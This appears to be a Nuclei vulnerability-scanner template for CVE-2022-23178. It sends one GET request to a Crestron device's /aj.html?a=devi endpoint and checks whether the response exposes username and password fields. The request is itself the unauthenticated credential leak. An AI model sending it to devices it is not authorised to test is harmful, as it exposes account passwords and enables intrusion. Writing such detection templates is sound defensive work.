id: crestron-aj-html-account-password-leak
info:
  name: Crestron aj.html Account Password Leak (CVE-2022-23178)
  author: ProjectDiscoveryAI
  severity: high
  tags: cve,cve-2022-23178
http:
  - method: GET
    path:
      - "{{BaseURL}}/aj.html?a=devi"
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - "uname"
          - "upassword"
          - "login_ur"
        condition: and
      - type: word
        words:
          - "<"
        negative: true
